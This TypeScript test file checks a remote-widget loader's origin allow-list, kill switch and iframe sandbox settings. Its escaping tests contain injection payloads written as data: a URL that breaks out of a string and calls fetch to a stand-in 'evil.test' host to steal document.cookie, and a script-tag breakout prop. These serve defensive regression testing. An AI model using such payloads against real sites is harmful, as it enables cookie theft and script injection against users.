import './setup.ts';
import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import {
  loadRemote,
  preloadRemote,
  configureSecurity,
  clearRemoteCache,
} from '../src/core/remote.ts';

// Reset global security policy between tests since it's module-level state.
beforeEach(() => {
  configureSecurity({});
  clearRemoteCache();
});

describe('configureSecurity / trusted origins', () => {
  it('allows any origin when no trustedOrigins configured', () => {
    const Widget = loadRemote({ url: 'http://evil.test/w.js' });
    const node = Widget() as HTMLElement;
    // No synchronous error — validateOrigin passes when unrestricted.
    assert.equal(node.getAttribute('data-remote'), 'http://evil.test/w.js');
  });

  it('blocks a URL whose origin is not in the trusted list', () => {
    configureSecurity({ trustedOrigins: ['http://good.test'] });
    let caughtError: Error | null = null;
    const Widget = loadRemote({
      url: 'http://evil.test/w.js',
      onError: (err) => {
        caughtError = err;
        return document.createElement('span');
      },
    });
    const node = Widget() as HTMLElement;
    assert.ok(caughtError, 'onError should be invoked synchronously for a blocked origin');
    assert.match(caughtError!.message, /Blocked untrusted origin/);
    assert.equal(node.querySelector('span') !== null, true);
  });

  it('allows a URL whose origin is in the trusted list', () => {
    configureSecurity({ trustedOrigins: ['http://good.test'] });
    let caughtError: Error | null = null;
    const Widget = loadRemote({
      url: 'http://good.test/w.js',
      onError: (err) => { caughtError = err; return document.createElement('span'); },
    });
    Widget();
    assert.equal(caughtError, null);
  });

  it('blockAll kill switch blocks every remote regardless of trust list', () => {
    configureSecurity({ trustedOrigins: ['http://good.test'], blockAll: true });
    let caughtError: Error | null = null;
    const Widget = loadRemote({
      url: 'http://good.test/w.js',
      onError: (err) => { caughtError = err; return document.createElement('span'); },
    });
    Widget();
    assert.ok(caughtError);
    assert.match(caughtError!.message, /Remote loading is disabled/);
  });

  it('rejects a malformed URL rather than throwing an unhandled parse error', () => {
    configureSecurity({ trustedOrigins: ['http://good.test'] });
    let caughtError: Error | null = null;
    const Widget = loadRemote({
      url: 'not a url',
      onError: (err) => { caughtError = err; return document.createElement('span'); },
    });
    Widget();
    assert.ok(caughtError);
    assert.match(caughtError!.message, /Invalid remote URL/);
  });
});

describe('preloadRemote', () => {
  it('rejects for an untrusted origin without mounting anything', async () => {
    configureSecurity({ trustedOrigins: ['http://good.test'] });
    await assert.rejects(
      () => preloadRemote('http://evil.test/w.js'),
      /Blocked untrusted origin/
    );
  });
});

describe('loadRemote isolation modes', () => {
  it('defaults to isolate="none" and records it on the container', () => {
    const Widget = loadRemote({ url: 'http://good.test/w.js' });
    const node = Widget() as HTMLElement;
    assert.equal(node.getAttribute('data-isolate'), 'none');
  });

  it('mounts a sandboxed iframe when isolate="iframe"', () => {
    const Widget = loadRemote({ url: 'http://good.test/w.js', isolate: 'iframe' });
    const node = Widget() as HTMLElement;
    const iframe = node.querySelector('iframe');
    assert.ok(iframe, 'an iframe must be mounted for isolate="iframe"');
    assert.ok(iframe!.getAttribute('sandbox')?.includes('allow-scripts'));
  });

  it('never grants allow-same-origin on the sandboxed iframe, even when network/storage permissions are requested', () => {
    // Regression test for a sandbox-escape risk: allow-same-origin + allow-scripts
    // on a srcdoc iframe lets the iframe assume the HOST's origin, not an isolated one.
    const Widget = loadRemote({
      url: 'http://good.test/w.js',
      isolate: 'iframe',
      permissions: ['network', 'storage', 'dom'],
    });
    const node = Widget() as HTMLElement;
    const iframe = node.querySelector('iframe')!;
    const sandbox = iframe.getAttribute('sandbox') ?? '';
    assert.ok(!sandbox.includes('allow-same-origin'), `sandbox must never include allow-same-origin, got: "${sandbox}"`);
  });

  it('grants only user-activated top navigation, never unrestricted allow-top-navigation', () => {
    const Widget = loadRemote({
      url: 'http://good.test/w.js',
      isolate: 'iframe',
      permissions: ['navigation'],
    });
    const node = Widget() as HTMLElement;
    const iframe = node.querySelector('iframe')!;
    const sandbox = iframe.getAttribute('sandbox') ?? '';
    assert.ok(sandbox.includes('allow-top-navigation-by-user-activation'));
    assert.ok(!/allow-top-navigation(?!-by-user-activation)/.test(sandbox));
  });

  it('escapes single quotes in the URL so it cannot break out of the srcdoc import statement', () => {
    // A URL like  http://x.test/w.js'; fetch('http://evil.test/steal?c='+document.cookie); //
    // must not be able to terminate the string literal inside the generated <script>.
    const maliciousUrl = "http://good.test/w.js';fetch('http://evil.test/steal');//";
    const Widget = loadRemote({
      url: maliciousUrl,
      isolate: 'iframe',
    });
    const node = Widget() as HTMLElement;
    const iframe = node.querySelector('iframe') as HTMLIFrameElement;
    const srcdoc = iframe.srcdoc;
    // The raw single quote from the URL must not appear unescaped inside the import statement.
    const importLine = srcdoc.split('\n').find((l) => l.includes('import widget'))!;
    assert.ok(!importLine.includes("w.js';fetch"), 'raw quote must be escaped, not passed through verbatim');
    assert.ok(importLine.includes('%27'), 'single quote should be percent-encoded');
  });

  it('escapes angle brackets in serialized props to prevent closing the module script tag', () => {
    const Widget = loadRemote({
      url: 'http://good.test/w.js',
      isolate: 'iframe',
      props: { payload: '</script><script>alert(1)</script>' },
    });
    const node = Widget() as HTMLElement;
    const iframe = node.querySelector('iframe') as HTMLIFrameElement;
    assert.ok(!iframe.srcdoc.includes('</script><script>alert(1)'),
      'a literal </script> from props must not be able to terminate the module script block');
  });
});

describe('clearRemoteCache', () => {
  it('is safe to call with no prior loads', () => {
    assert.doesNotThrow(() => clearRemoteCache());
    assert.doesNotThrow(() => clearRemoteCache('http://good.test/w.js'));
  });
});
